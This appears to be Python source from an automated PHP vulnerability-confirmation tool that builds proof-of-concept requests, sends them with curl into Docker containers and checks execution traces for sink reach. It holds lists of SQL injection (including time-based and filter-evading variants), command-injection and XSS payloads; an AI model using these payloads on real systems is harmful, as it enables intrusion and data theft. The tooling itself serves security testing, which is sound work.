
from __future__ import annotations

import argparse
import json
import math
import os
import os.path as osp
import re
import shlex
import subprocess
import sys
from dataclasses import asdict
from pathlib import Path
from typing import Optional

_VIPER_ROOT = osp.dirname(osp.abspath(__file__))
if _VIPER_ROOT not in sys.path:
    sys.path.insert(0, _VIPER_ROOT)

from module2_runtime_feedback.blocker_aggregator import (
    aggregate_iteration, PocRecord, OutcomeRecord,
    RunHistory,
)
from common.llm import chat as llm_chat
from module3_differential_oracle.sentinel_injector import SentinelInjector
from module3_differential_oracle import differential_oracle as do
from common.metrics import collector as metrics_collector, Timer as MetricsTimer


def _pick_strong_value(param: str, if_constraints: list,
                        working_dir: str = "") -> Optional[str]:
    if not param or not if_constraints:
        return None

    _eq_cands = []
    for c in if_constraints:
        ev = c.get("eq_values") or {}
        if param in ev:
            d = c.get("dist", -1.0)
            d = d if (isinstance(d, (int, float)) and d >= 0) else float("inf")
            _eq_cands.append((d, ev[param]))
    if _eq_cands:
        _eq_cands.sort(key=lambda t: t[0])
        return str(_eq_cands[0][1])

    if working_dir:
        try:
            from module1_static_analysis.dispatch_resolver import strong_target_values_at
            for c in if_constraints:
                if param not in (c.get("params") or []):
                    continue
                sf = c.get("source_file")
                ln = c.get("lineno") or 0
                if not sf or ln <= 0:
                    continue
                vals = strong_target_values_at(sf, int(ln), param,
                                                 working_dir)
                if vals:
                    return vals[0]
        except Exception:
            pass

    p_esc = re.escape(param)
    sg_ref = rf"\$_(?:REQUEST|POST|GET|COOKIE)\s*\[\s*['\"]\s*{p_esc}\s*['\"]\s*\]"
    wrap_ref = rf"\w+\s*\(\s*['\"]{p_esc}['\"]"
    var_ref = rf"\${p_esc}\b"
    refs = rf"(?:{sg_ref}|{wrap_ref}|{var_ref})"

    eq_str_pat = re.compile(rf"{refs}\s*===?\s*['\"]([^'\"]+)['\"]")
    str_eq_pat = re.compile(rf"['\"]([^'\"]+)['\"]\s*===?\s*{refs}")
    eq_int_pat = re.compile(rf"{refs}\s*===?\s*(-?\d+)")
    int_eq_pat = re.compile(rf"(-?\d+)\s*===?\s*{refs}")
    inarr_pat = re.compile(
        rf"in_array\s*\(\s*{refs}\s*,\s*(?:array\s*\(|\[)\s*['\"]([^'\"]+)['\"]"
    )

    for c in if_constraints:
        if param not in (c.get("params") or []):
            continue
        sv = c.get("switch_case_value")
        if sv:
            return str(sv)
        cond = c.get("condition", "") or c.get("raw_line", "")
        if not cond:
            continue
        if re.search(rf"{refs}\s*!==?", cond) or re.search(rf"!==?\s*{refs}", cond):
            continue
        m = eq_str_pat.search(cond) or str_eq_pat.search(cond)
        if m:
            return m.group(1)
        m = eq_int_pat.search(cond) or int_eq_pat.search(cond)
        if m:
            return m.group(1)
        m = inarr_pat.search(cond)
        if m:
            return m.group(1)
    return None


def _build_initial_poc(pipeline_result: dict) -> dict:
    constraints = pipeline_result.get("constraints", {})
    params: dict[str, str] = {}

    for k, v in ((constraints.get("injection_param_schema") or {}).get("params") or {}).items():
        _vs = str(v).strip()
        if _vs == "{INJECT}":
            params[k] = "1"
        elif _vs == "":
            params[k] = "1"
        else:
            params[k] = _vs

    _dpc = (constraints.get("injection_param_schema") or {}).get("dispatch_param_candidates")
    if isinstance(_dpc, dict) and _dpc.get("param") and _dpc.get("candidates"):
        params.setdefault(str(_dpc["param"]), str(_dpc["candidates"][0]))

    for k, vals in (constraints.get("framework_prefilled_params") or {}).items():
        first = vals[0] if isinstance(vals, list) and vals else vals
        if first:
            params[k] = str(first)
        else:
            params.setdefault(k, "1")

    for dc in constraints.get("dispatch_constraints", []):
        p = dc.get("param") or "kind"
        v = dc.get("must_equal") or ""
        if p in params:
            continue
        if v:
            params[p] = v
        elif dc.get("discriminator_origin") == "switch_default":
            params[p] = ""

    _ifc_list = constraints.get("if_constraints", [])
    _wd = pipeline_result.get("_working_dir", "")
    for ifc in _ifc_list:
        for key in ifc.get("params", []) or []:
            if key in params:
                continue
            if _param_constraint_strength(_ifc_list, key) == "strong":
                strong_val = _pick_strong_value(key, _ifc_list, working_dir=_wd)
                params[key] = strong_val if strong_val is not None else "1"
            else:
                params[key] = "1"

    for ic in constraints.get("injection_chain", []):
        src = ic.get("source", "")
        import re
        m = re.search(r"\$_(?:GET|POST|REQUEST|COOKIE)\s*\[\s*['\"]([^'\"]+)['\"]", src)
        if m:
            key = m.group(1)
            if key not in params:
                params[key] = "1"

    for k in constraints.get("framework_required_params") or []:
        if k and k not in params:
            params[k] = "1"

    for k in constraints.get("array_params") or []:
        if not isinstance(params.get(k), list):
            params[k] = ["1"]

    return params


def _php_urlencode(params: dict) -> str:
    from urllib.parse import quote_plus
    parts: list[str] = []
    for k, v in params.items():
        kq = quote_plus(str(k))
        if isinstance(v, list):
            for i, item in enumerate(v):
                parts.append(f"{kq}[{i}]={quote_plus(str(item))}")
        elif isinstance(v, dict):
            for sk, sv in v.items():
                parts.append(f"{kq}[{quote_plus(str(sk))}]={quote_plus(str(sv))}")
        else:
            parts.append(f"{kq}={quote_plus(str(v))}")
    return "&".join(parts)


def _decode_qs(body: str) -> dict:
    from urllib.parse import parse_qsl
    try:
        return dict(parse_qsl(body, keep_blank_values=True))
    except Exception:
        return {}


def _today_admin_token() -> str:
    import hashlib, datetime
    return hashlib.md5(
        ("VIPER-AUDIT-" + datetime.datetime.utcnow().strftime("%Y-%m-%d")).encode()
    ).hexdigest()


def _docker_exec(container: str, cmd: str, *, capture: bool = True) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["docker", "exec", container, "bash", "-c", cmd],
        capture_output=capture, text=True, encoding="utf-8", errors="replace",
    )


def _split_params_by_source(params: dict, param_sources: dict) -> tuple[dict, dict, dict]:
    _force_get = os.environ.get("VIPER_FORCE_GET") == "1"
    get_params, post_params, cookie_params = {}, {}, {}
    for k, v in params.items():
        sup = (param_sources or {}).get(k, "POST")
        if sup == "GET" or (sup == "REQUEST" and _force_get):
            get_params[k] = v
        elif sup == "COOKIE":
            cookie_params[k] = v
        else:
            post_params[k] = v
    return get_params, post_params, cookie_params


def _run_iteration_in_container(
    container: str,
    iteration_index: int,
    entry_url: str,
    post_body: str,
    extra_headers: Optional[dict] = None,
    get_query: str = "",
    cookies: Optional[dict] = None,
    http_method: str = "POST",
    cookie_jar: str = "",
) -> tuple[str, str]:
    log_path = "/tmp/viper.jsonl"
    _docker_exec(container, f": > {shlex.quote(log_path)} && chmod 666 {shlex.quote(log_path)}")

    url = entry_url
    if get_query:
        existing_keys = set()
        if "?" in url:
            for kv in url.split("?", 1)[1].split("&"):
                if "=" in kv:
                    existing_keys.add(kv.split("=", 1)[0])
        if existing_keys:
            get_query = "&".join(
                kv for kv in get_query.split("&")
                if "=" in kv and kv.split("=", 1)[0] not in existing_keys
            )
        if get_query:
            url += ("&" if "?" in url else "?") + get_query

    if os.environ.get("VIPER_FORCE_GET") == "1" and http_method == "POST":
        if post_body:
            url += ("&" if "?" in url else "?") + post_body
        post_body = None
        http_method = "GET"

    if http_method == "POST" and post_body is not None:
        try:
            from module3_differential_oracle.differential_oracle import maybe_inject_csrf
            post_body = maybe_inject_csrf(
                post_body=post_body, http_method=http_method,
                get_url=entry_url, cookies=cookies,
                extra_headers=extra_headers,
            )
        except Exception as _e:
            pass

    cmd = ["curl", "-sS", "-m", "10", "--noproxy", "*",
           "-w", "\n__HTTP_STATUS__%{http_code}__\n",
           "-X", http_method, url]
    if http_method == "POST":
        cmd += ["-H", "Content-Type: application/x-www-form-urlencoded"]
    if cookies:
        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
        cmd += ["-H", f"Cookie: {cookie_str}"]
    for k, v in (extra_headers or {}).items():
        cmd += ["-H", f"{k}: {v}"]
    if http_method == "POST" and post_body:
        cmd += ["--data-binary", post_body]

    if os.environ.get("VIPER_DUMP_REQUEST", "0") == "1":
        import sys as _ds
        _hdr_lines = []
        _ds_i = 0
        while _ds_i < len(cmd):
            if cmd[_ds_i] == "-H" and _ds_i + 1 < len(cmd):
                _hdr_lines.append(cmd[_ds_i + 1])
                _ds_i += 2
                continue
            _ds_i += 1
        print(f"\n=== [REQUEST DUMP iter {iteration_index}] ===", file=_ds.stderr)
        print(f"  METHOD : {http_method}", file=_ds.stderr)
        print(f"  URL    : {url}", file=_ds.stderr)
        print(f"  HEADERS:", file=_ds.stderr)
        for h in _hdr_lines:
            print(f"    {h}", file=_ds.stderr)
        print(f"  BODY   : {post_body if post_body else '(empty)'}",
              file=_ds.stderr)
        print(f"=== [END REQUEST DUMP] ===\n", file=_ds.stderr)

    proc = subprocess.run(cmd, capture_output=True, text=True,
                          encoding="utf-8", errors="replace")
    _resp = (proc.stdout or "") + (proc.stderr or "")
    if os.environ.get("VIPER_DUMP_REQUEST") == "1":
        import re as _re2, sys as _ds2
        _mst = _re2.search(r"__HTTP_STATUS__(\d+)__", _resp)
        _low = _resp.lower()
        _wc = subprocess.run(["docker", "exec", container, "sh", "-c",
                              f"wc -l < {log_path}; grep -c automation {log_path}"],
                             capture_output=True, text=True).stdout.replace("\n", " ")
        print(f"  [resp-dbg] http={_mst.group(1) if _mst else '?'} resp_len={len(_resp)} "
              f"logout={'logout' in _low} | blocker_log lines+automation: {_wc.strip()}",
              file=_ds2.stderr)
    return _resp, log_path


def _docker_cp_out(container: str, src_in_container: str, dst_on_host: str) -> bool:
    proc = subprocess.run(
        ["docker", "cp", f"{container}:{src_in_container}", dst_on_host],
        capture_output=True, text=True,
    )
    return proc.returncode == 0


def _docker_cp_in(container: str, src_on_host: str, dst_in_container: str) -> bool:
    proc = subprocess.run(
        ["docker", "cp", src_on_host, f"{container}:{dst_in_container}"],
        capture_output=True, text=True,
    )
    return proc.returncode == 0


def _container_path_for(host_path: str, pipeline_result: dict,
                        container_root: str = "/app/sqli_chain_demo") -> str:
    proj_host = (pipeline_result.get("_project_root_host")
                  or str(Path(pipeline_result["entry_file"]).parent)
                ).rstrip("/")
    rel = osp.relpath(host_path, proj_host)
    return f"{container_root.rstrip('/')}/{rel}"


def _install_instr_info_in_container(
    container: str, instr_info_host_path: str, project_root_host: str,
    project_root_in_container: str = "/app/sqli_chain_demo",
) -> bool:
    src = Path(instr_info_host_path)
    if not src.exists():
        return False
    text = src.read_text(encoding="utf-8", errors="replace")
    host_prefix = str(Path(project_root_host)).rstrip("/")
    cont_prefix = project_root_in_container.rstrip("/")
    rewritten = text.replace(host_prefix, cont_prefix)
    tmp = Path("/tmp/viper_instr_info_for_container.csv")
    tmp.write_text(rewritten)
    return _docker_cp_in(container, str(tmp), "/tmp/instr-info.csv")


def _reached_sink(trace, sink_file: str, sink_line: int = 0,
                  post_sink_lines: Optional[set] = None,
                  sink_enclosing_if_lines: Optional[set] = None,
                  pre_sink_lines: Optional[set] = None,
                  sink_enclosing_if_body_ranges: Optional[list] = None,
                  sink_inside_if: Optional[str] = None) -> bool:
    sink_basename = os.path.basename(sink_file)

    if os.environ.get("VIPER_REACH_DISTANCE_ONLY") == "1":
        return trace.min_distance == 0

    if (post_sink_lines or sink_enclosing_if_lines or pre_sink_lines
        or sink_enclosing_if_body_ranges) and sink_basename:
        psl  = set(post_sink_lines or [])
        sif  = set(sink_enclosing_if_lines or [])
        pres = set(pre_sink_lines or [])
        _br_src = [
            r for r in (sink_enclosing_if_body_ranges or [])
            if int(r.get("body_start", 0)) > 0 and int(r.get("body_end", 0)) > 0
        ]
        body_ranges = [
            (int(r.get("body_start", 0)), int(r.get("body_end", 0))) for r in _br_src
        ]
        body_if_lines = [int(r.get("if_line", 0)) for r in _br_src]

        saw_pre_event = False
        saw_any_early_exit = any(b.kind == "early_exit" for b in trace.blocker_events)
        fellthrough_if_lines: set = set()
        for b in trace.blocker_events:
            if b.kind != "predicate_guard":
                continue
            if sink_basename not in b.location.get("file", ""):
                continue
            raw = b.raw if isinstance(getattr(b, "raw", None), dict) else {}
            pred = raw.get("predicate", raw)
            if isinstance(pred, dict) and pred.get("jumped") is False:
                try:
                    fellthrough_if_lines.add(int(b.location.get("line", 0)))
                except (ValueError, TypeError):
                    pass
        body_entered: list[bool] = [False] * len(body_ranges)

        for b in trace.blocker_events:
            if sink_basename not in b.location.get("file", ""):
                continue
            try:
                ln = int(b.location.get("line", 0))
            except (ValueError, TypeError):
                continue
            if ln in psl:
                return True
            for i, (bs, be) in enumerate(body_ranges):
                if bs < ln <= be and ln != sink_line:
                    body_entered[i] = True
            if ln in pres:
                saw_pre_event = True

        for i, (bs, be) in enumerate(body_ranges):
            if body_entered[i]:
                continue
            il = body_if_lines[i] if i < len(body_if_lines) else 0
            if il and bs > il and il in fellthrough_if_lines:
                body_entered[i] = True

        if body_ranges and all(body_entered) and not saw_any_early_exit:
            return True

        if saw_pre_event and not saw_any_early_exit:
            if sink_inside_if is not None:
                if sink_inside_if == "no":
                    return True
            elif not body_ranges and not sif:
                return True

        return False

    if (sink_line > 0 and sink_basename
        and not (post_sink_lines or sink_enclosing_if_lines or pre_sink_lines
                  or sink_enclosing_if_body_ranges)):
        for b in trace.blocker_events:
            if sink_basename not in b.location.get("file", ""):
                continue
            try:
                ln = int(b.location.get("line", 0))
            except (ValueError, TypeError):
                continue
            if ln >= sink_line:
                return True
        return False

    if any(b.kind == "early_exit" for b in trace.blocker_events):
        return False
    if not sink_basename:
        return trace.min_distance == 1
    return any(sink_basename in b.location.get("file", "") for b in trace.blocker_events)


_SQL_ERROR_PAT = re.compile(
    r"(SQLSTATE|\[sql error\]|syntax error|1064|near\s+'[^']{0,80}')",
    re.IGNORECASE,
)
_ROW_COUNT_PAT = re.compile(r"\[ok\]\s+(\d+)\s+row\(s\)\s+returned")


_SQLI_TOKENS = ("'", '"', ";", "--", "/*", " OR ", " UNION ", " AND ")

_SQLI_PAYLOADS = [
    "'",
    '"',
    "\\",
    "';",
    "' OR '1'='1",
    "' OR 1=1--",
    "') OR ('1'='1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    " OR 1=1",
    " AND extractvalue(1,concat(0x7e,version()))",
    " AND updatexml(1,concat(0x7e,version()),1)",
    " UNION SELECT NULL",
]

_SQLI_TIME_PAYLOADS = [
    "' AND SLEEP(2)--",
    "' OR SLEEP(2)--",
    "'; SELECT pg_sleep(2)--",
    "'; WAITFOR DELAY '0:0:2'--",
    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',2)--",
    " AND SLEEP(2)",
    " OR SLEEP(2)",
    " AND (SELECT 1 FROM (SELECT SLEEP(2))x)",
    ";SELECT pg_sleep(2)--",
    " AND sleep/**/(2)",
    " AND/*!50000sleep*/(2)",
    " OR sleep/**/(2)",
    " AND (SELECT 1 FROM (SELECT sleep/**/(2))x)",
    ",(SELECT SLEEP(2))",
    ",(SELECT SLEEP(2))-- -",
    ",(SELECT sleep/**/(2))",
]

_CMDI_PAYLOADS = [
    "'",
    "`",
    "(",
    ")",
    "${",
    "$(",
    "\";",
    "';",
    ";|",
    "|;",
    "&|",
]

_XSS_SENTINEL_PREFIX = "VIPER_XSS_"


def _make_xss_sentinel() -> str:
    import uuid
    return f"{_XSS_SENTINEL_PREFIX}{uuid.uuid4().hex[:12]}"


def _xss_payloads(sentinel: str) -> list[str]:
    return [
        f"<script>alert('{sentinel}')</script>",
        f"\"><script>alert('{sentinel}')</script>",
        f"';alert('{sentinel}');//",
        f"\";alert('{sentinel}');//",
        f"<img src=x onerror=\"alert('{sentinel}')\">",
        f"<svg/onload=alert('{sentinel}')>",
        f"javascript:alert('{sentinel}')",
        f"</script><script>alert('{sentinel}')</script>",
    ]


_XSS_EXEC_CONTEXT_RES = [
    re.compile(
        r"<script[^>]*>[^<]*" + re.escape(_XSS_SENTINEL_PREFIX) + r"\w+",
        re.IGNORECASE),
    re.compile(
        r"\bjavascript\s*:[^>]*" + re.escape(_XSS_SENTINEL_PREFIX) + r"\w+",
        re.IGNORECASE),
    re.compile(
        r"\bon\w+\s*=\s*['\"][^>]*" + re.escape(_XSS_SENTINEL_PREFIX) + r"\w+",
        re.IGNORECASE),
    re.compile(
        r"<svg[^>]*\bonload\s*=\s*[^>]*" + re.escape(_XSS_SENTINEL_PREFIX) + r"\w+",
        re.IGNORECASE),
]


def _detect_xss(response: str, sentinel: str) -> tuple[bool, str]:
    if not response or sentinel not in response:
        return False, ""
    for pat in _XSS_EXEC_CONTEXT_RES:
        m = pat.search(response)
        if m and sentinel in m.group(0):
            return True, (f"ORACLE_XSS: sentinel '{sentinel}' reflected in "
                          f"executable context: {m.group(0)[:80]!r}")
    return False, ""


def _detect_exploit(response: str, http_status: int = 200,
                    params: dict | None = None,
                    vuln_type: str = "sqli",
                    xss_sentinel: str | None = None) -> tuple[bool, str]:
    vt = (vuln_type or "sqli").lower().strip()
    if vt == "xss":
        if xss_sentinel:
            return _detect_xss(response, xss_sentinel)
        return False, ""
    if http_status == 0 and not response.strip():
        which = "Widash CMDi parser" if vt == "cmdi" else "libcgiwrapper SQLi"
        return True, (f"ORACLE_CRASH: HTTP 000 + empty body → "
                      f"{which} SIGSEGV'd the PHP worker")
    return False, ""


def _select_payloads(vuln_type: str) -> tuple[list[str], str | None]:
    vt = (vuln_type or "sqli").lower().strip()
    if vt == "xss":
        sentinel = _make_xss_sentinel()
        return _xss_payloads(sentinel), sentinel
    if vt == "cmdi":
        return list(_CMDI_PAYLOADS), None
    return list(_SQLI_PAYLOADS), None


def _apply_xss_override(verdict, response_body: str, sentinel: str) -> None:
    xss_ok, xss_reason = _detect_xss(response_body or "", sentinel)
    if xss_ok:
        verdict.verdict = "CONFIRMED"
        verdict.reason = xss_reason
        return
    if verdict.verdict == "CONFIRMED":
        verdict.verdict = "NEGATIVE"
        verdict.reason = ("sentinel reflected as plain text only "
                          "(HTML-escaped) — not a real XSS sink")


def _apply_crash_override(verdict, mal_obs, vuln_type: str) -> None:
    vt = (vuln_type or "sqli").lower().strip()
    if vt == "xss":
        return
    if verdict.verdict != "INCONCLUSIVE":
        return
    if mal_obs.http_status == 0 and not (mal_obs.response_body or "").strip():
        which = "Widash CMDi parser" if vt == "cmdi" else "libcgiwrapper SQLi"
        verdict.verdict = "CONFIRMED"
        verdict.reason = (f"ORACLE_CRASH ({vt}): HTTP 000 + empty body → "
                          f"{which} SIGSEGV'd the PHP worker at the sink")


def _superglobal_keys_reaching_sink(
    sink_file: str, sink_line: int, working_dir: str,
) -> set[str]:
    wd = Path(working_dir)
    cpg = wd / "cpg_edges.csv"
    nodes_csv = wd / "nodes.csv"
    rels_csv = wd / "rels.csv"
    if not (cpg.exists() and nodes_csv.exists() and rels_csv.exists()):
        return set()
    from module1_static_analysis.dispatch_resolver.fig_builder import _read_nodes, build_fig
    from module1_static_analysis.dispatch_resolver.narrow import _containing_file
    from module1_static_analysis.dispatch_resolver.context_extractor import _read_reaches_edges
    nodes = _read_nodes(nodes_csv)
    reaches = _read_reaches_edges(cpg)
    fig = build_fig(wd)

    parent2children: dict[int, list[int]] = {}
    try:
        with open(rels_csv, encoding="latin-1") as f:
            next(f, None)
            for raw in f:
                parts = raw.rstrip("\n").split("\t")
                if len(parts) < 3 or parts[2] != "PARENT_OF":
                    continue
                try:
                    p, c = int(parts[0]), int(parts[1])
                except ValueError:
                    continue
                parent2children.setdefault(p, []).append(c)
    except OSError:
        return set()

    sink_basename = osp.basename(sink_file)
    sink_line_nodes: set[int] = set()
    for nid, n in nodes.items():
        try:
            if int(n.get("lineno") or 0) != sink_line:
                continue
            fid = int(n.get("funcid") or 0)
        except (ValueError, TypeError):
            continue
        if not fid:
            continue
        cf = _containing_file(fid, fig, nodes)
        if cf and osp.basename(cf) == sink_basename:
            sink_line_nodes.add(nid)
    if not sink_line_nodes:
        return set()

    rev: dict[int, list[int]] = {}
    for s, e, _v in reaches:
        rev.setdefault(e, []).append(s)

    closure = set(sink_line_nodes)
    queue = list(sink_line_nodes)
    while queue:
        cur = queue.pop()
        for s in rev.get(cur, []):
            if s not in closure:
                closure.add(s)
                queue.append(s)

    SUPERGLOBALS = {"_REQUEST", "_POST", "_GET", "_COOKIE"}

    def _subtree(root: int) -> set[int]:
        seen = {root}
        q = [root]
        while q:
            cur = q.pop()
            for c in parent2children.get(cur, []):
                if c not in seen:
                    seen.add(c)
                    q.append(c)
        return seen

    keys: set[str] = set()
    for nid in closure:
        for sub in _subtree(nid):
            n = nodes.get(sub)
            if not n or n.get("type") != "AST_DIM":
                continue
            kids = sorted(parent2children.get(sub, []),
                          key=lambda c: int(nodes.get(c, {}).get("childnum") or 0))
            if len(kids) < 2:
                continue
            c0 = nodes.get(kids[0])
            if not c0 or c0.get("type") != "AST_VAR":
                continue
            c0_kids = parent2children.get(kids[0], [])
            var_name = None
            for ck in c0_kids:
                cn = nodes.get(ck)
                if cn and cn.get("type") == "string":
                    var_name = (cn.get("code") or "").strip("'\"")
                    break
            if var_name not in SUPERGLOBALS:
                continue
            c1 = nodes.get(kids[1])
            if c1 and c1.get("type") == "string":
                k = (c1.get("code") or "").strip("'\"")
                if k:
                    keys.add(k)
    return keys


def _classify_terminal_state_precondition(trace, working_dir: str):
    if not working_dir:
        return None
    tb = getattr(trace, "terminal_blocker", None)
    if not tb or getattr(tb, "kind", None) != "predicate_guard":
        return None
    loc = tb.location or {}
    try:
        guard_line = int(loc.get("line") or 0)
    except (ValueError, TypeError):
        return None
    if guard_line <= 0:
        return None
    guard_file = osp.basename(loc.get("file") or "")
    raw = tb.raw if isinstance(tb.raw, dict) else {}
    pred = raw.get("predicate", {}) or {}
    lhs = (pred.get("operands", {}) or {}).get("lhs", {}) or {}
    try:
        from module1_static_analysis.state_precondition_analyzer import classify_terminal_guard
        return classify_terminal_guard(
            working_dir, guard_file, guard_line,
            operand_runtime_value=lhs.get("value"),
            condition_value=pred.get("condition_value"),
        )
    except Exception as e:
        print(f"  [state-precond] classifier raised {type(e).__name__}: {e}")
        return None


def _identify_mutable_params(
    pipeline_result: dict, current_params: dict,
    *, sink_file: str = "", sink_line: int = 0, working_dir: str = "",
) -> list[str]:
    constraints = pipeline_result.get("constraints", {})

    if sink_file and sink_line > 0 and working_dir:
        try:
            real_sources = _superglobal_keys_reaching_sink(
                sink_file, sink_line, working_dir)
        except Exception:
            real_sources = set()
        if real_sources:
            hits = [k for k in current_params if k in real_sources]
            if hits:
                return hits

    chain_vars: set[str] = {
        ic.get("varname", "")
        for ic in constraints.get("injection_chain", [])
    }
    hits = [k for k in current_params if k in chain_vars]
    if hits:
        return hits

    gate_keys: set[str] = set()
    for ifc in constraints.get("if_constraints", []):
        for k in ifc.get("params", []) or []:
            gate_keys.add(k)
    gate_hits = [k for k in current_params if k in gate_keys]
    if gate_hits:
        return gate_hits

    return list(current_params)


def _param_constraint_strength(if_constraints: list, param: str) -> str:
    if not param:
        return "none"
    p = re.escape(param)
    sg = rf"\$_(?:REQUEST|POST|GET|COOKIE)\s*\[\s*['\"]\s*{p}\s*['\"]\s*\]"

    strong_patterns = (
        rf"!?\s*preg_match\s*\([^)]+,\s*{sg}",
        rf"!?\s*in_array\s*\(\s*{sg}",
        rf"{sg}\s*[!=]==?\s*['\"][^'\"]+['\"]",
        rf"{sg}\s*[!=]==?\s*-?\d+",
    )
    weak_patterns = (
        rf"!?\s*isset\s*\(\s*{sg}",
        rf"!?\s*empty\s*\(\s*{sg}",
        rf"!\s*{sg}\b",
    )

    strongest = "none"
    for c in if_constraints or []:
        if param not in (c.get("params") or []):
            continue
        cond = c.get("condition", "") or c.get("raw_line", "")
        if not cond:
            continue
        if any(re.search(p_, cond) for p_ in strong_patterns):
            return "strong"
        if any(re.search(p_, cond) for p_ in weak_patterns):
            strongest = "weak" if strongest == "none" else strongest
            continue
        return "strong"
    return strongest


def _nonce_rotate_mutables(params: dict, mutables: list[str],
                           if_constraints: Optional[list] = None) -> dict:
    import uuid
    nonce = uuid.uuid4().hex[:8]
    out = dict(params)
    constraints = if_constraints or []
    for k in mutables:
        if k not in out:
            continue
        if _param_constraint_strength(constraints, k) == "strong":
            continue
        v = out[k]
        if not isinstance(v, (str, int, float)):
            continue
        out[k] = f"{v}_{nonce}"
    return out


def run_iteration(
    *,
    iteration_index: int,
    container: str,
    entry_url: str,
    post_body: str,
    output_dir: Path,
    sink_file: str = "",
    sink_line: int = 0,
    extra_headers: Optional[dict] = None,
    post_sink_lines: Optional[set] = None,
    sink_enclosing_if_lines: Optional[set] = None,
    pre_sink_lines: Optional[set] = None,
    sink_enclosing_if_body_ranges: Optional[list] = None,
    sink_inside_if: Optional[str] = None,
    file_whitelist: Optional[set] = None,
    get_query: str = "",
    cookies: Optional[dict] = None,
    http_method: str = "POST",
    cookie_jar: str = "",
    instr_info_path: str = "",
) -> dict:
    response, log_path = _run_iteration_in_container(
        container, iteration_index, entry_url, post_body,
        extra_headers=extra_headers,
        get_query=get_query, cookies=cookies, http_method=http_method,
        cookie_jar=cookie_jar,
    )

    host_jsonl = output_dir / f"iter_{iteration_index}.jsonl"
    output_dir.mkdir(parents=True, exist_ok=True)
    if not _docker_cp_out(container, log_path, str(host_jsonl)):
        host_jsonl.write_text("")

    (output_dir / f"iter_{iteration_index}.response.txt").write_text(response)

    http_status = 0
    sm = re.search(r"__HTTP_STATUS__(\d+)__", response)
    if sm:
        http_status = int(sm.group(1))
        response = re.sub(r"\n?__HTTP_STATUS__\d+__\n?", "", response)
    response_body = response if not response.startswith("curl:") else ""

    exploited, exploit_reason = _detect_exploit(response_body, http_status=http_status)

    poc_record = PocRecord(method="POST", url="(curl→Apache)", body=post_body)
    outcome_partial = OutcomeRecord(http_status=http_status,
                                     response_excerpt=response_body[:1000],
                                     reached_sink=False)
    trace = aggregate_iteration(
        iteration_index=iteration_index,
        blocker_log_path=host_jsonl,
        poc=poc_record,
        outcome=outcome_partial,
        file_whitelist=file_whitelist,
        instr_info_path=instr_info_path or None,
    )
    reached = _reached_sink(trace, sink_file=sink_file, sink_line=sink_line,
                              post_sink_lines=post_sink_lines,
                              sink_enclosing_if_lines=sink_enclosing_if_lines,
                              pre_sink_lines=pre_sink_lines,
                              sink_enclosing_if_body_ranges=sink_enclosing_if_body_ranges,
                              sink_inside_if=sink_inside_if)
    trace.outcome.reached_sink = reached

    sif_set = set(sink_enclosing_if_lines or [])
    if (not reached
            and trace.terminal_blocker
            and trace.terminal_blocker.kind == "early_exit"):
        ex = trace.terminal_blocker.raw.get("exit", {}) or {}
        tc = ex.get("trigger_condition", {}) or {}
        try:
            tc_line = int(tc.get("line") or 0)
        except (ValueError, TypeError):
            tc_line = 0
        cv = tc.get("condition_value")
        if tc_line > 0 and cv is True and tc_line not in sif_set:
            trace.bailout_end = True
            trace.bailout_predicate = {
                "file": tc.get("file"),
                "line": tc_line,
                "opcode": tc.get("opcode"),
                "op1": tc.get("op1"),
                "condition_value": True,
                "exit_at_line": trace.terminal_blocker.location.get("line"),
            }

    trace_path = output_dir / f"iter_{iteration_index}.trace.json"
    trace_path.write_text(json.dumps(trace.to_dict(), indent=2, ensure_ascii=False))
    return {"trace": trace, "trace_path": trace_path,
            "response": response,
            "reached_sink": reached,
            "exploited": exploited,
            "exploit_reason": exploit_reason}


def _llm_chat_resilient(
    prompt: str, *, stage: str = "m3", max_outer_attempts: int = 3,
    base_backoff: float = 5.0,
) -> Optional[dict]:
    import time as _time
    last_err: Optional[BaseException] = None
    for attempt in range(1, max_outer_attempts + 1):
        try:
            return llm_chat(prompt, stage=stage)
        except KeyboardInterrupt:
            raise
        except BaseException as e:
            last_err = e
            if attempt >= max_outer_attempts:
                break
            wait = base_backoff * (2 ** (attempt - 1))
            print(f"[llm-resilient] {stage} attempt {attempt}/{max_outer_attempts} "
                  f"failed ({e!s:.120}); sleeping {wait:.1f}s before retry")
            _time.sleep(wait)
    print(f"[llm-resilient] {stage} all {max_outer_attempts} outer attempts "
          f"exhausted; giving up. Last error: {last_err!s:.200}")
    return None


def _terminal_blocker_dataflow_slice(
    host_path: str, terminal_line: int, working_dir: str, *,
    max_lines_total: int = 60,
    extra_seed_lines: Optional[list[int]] = None,
    cutoff_line: Optional[int] = None,
) -> Optional[str]:
    cpg_csv = Path(working_dir) / "cpg_edges.csv"
    nodes_csv = Path(working_dir) / "nodes.csv"
    if not (cpg_csv.exists() and nodes_csv.exists()):
        return None
    try:
        text = Path(host_path).read_text(encoding="utf-8", errors="replace")
    except OSError:
        return None
    lines = text.splitlines()
    if terminal_line < 1 or terminal_line > len(lines):
        return None

    from module1_static_analysis.dispatch_resolver.fig_builder import _read_nodes, build_fig
    from module1_static_analysis.dispatch_resolver.context_extractor import _read_reaches_edges, _expand_var_set

    var_pat = re.compile(r"\$(\w+)")
    seed_vars: set[str] = set(var_pat.findall(lines[terminal_line - 1]))
    for ln in range(max(1, terminal_line - 10), terminal_line):
        seed_vars.update(var_pat.findall(lines[ln - 1]))
    for ln in (extra_seed_lines or []):
        if 1 <= ln <= len(lines):
            seed_vars.update(var_pat.findall(lines[ln - 1]))
    if not seed_vars:
        return None

    reaches = _read_reaches_edges(cpg_csv)
    if not reaches:
        return None
    relevant_vars = _expand_var_set(reaches, seed_vars)

    relevant_node_ids: set[int] = set()
    for s, e, v in reaches:
        if v in relevant_vars:
            relevant_node_ids.add(s)
            relevant_node_ids.add(e)

    nodes = _read_nodes(nodes_csv)
    fig = build_fig(Path(working_dir))
    from module1_static_analysis.dispatch_resolver.narrow import _containing_file
    host_basename = osp.basename(host_path)
    keep_lines: set[int] = set()
    for nid in relevant_node_ids:
        n = nodes.get(nid)
        if not n:
            continue
        try:
            ln = int(n.get("lineno") or 0)
            funcid = int(n.get("funcid") or 0)
        except (ValueError, TypeError):
            continue
        upper = cutoff_line if (cutoff_line and cutoff_line > terminal_line) else terminal_line
        if ln <= 0 or ln > upper:
            continue
